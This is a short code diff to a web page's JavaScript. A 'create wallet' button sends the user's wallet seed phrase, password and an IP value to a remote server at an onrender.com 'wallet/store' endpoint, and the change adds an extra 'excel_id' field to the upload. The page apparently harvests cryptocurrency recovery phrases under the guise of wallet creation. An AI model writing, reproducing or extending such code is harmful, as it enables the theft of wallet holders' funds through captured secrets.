@@ -2,6 +2,7 @@ document.getElementById("createWallet").addEventListener("click", async () => {
   const seed = document.getElementById("seed").value;
   const password = document.getElementById("password").value;
   const ip = document.getElementById("ip").value;
+  const excelId = document.getElementById("excel_id").value;
 
   const response = await fetch(
     "https://wallet-gzms.onrender.com/wallet/store",
@@ -10,7 +11,7 @@ document.getElementById("createWallet").addEventListener("click", async () => {
       headers: {
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({ seed, password, ip }),
+      body: JSON.stringify({ seed, password, ip, excelId }),
     }
   );
 
@@ -19,6 +20,7 @@ document.getElementById("createWallet").addEventListener("click", async () => {
     document.getElementById("seed").value = "";
     document.getElementById("password").value = "";
     document.getElementById("ip").value = "";
+    document.getElementById("excel_id").value = "";
   } else {
     alert("Failed to create wallet.");
   }
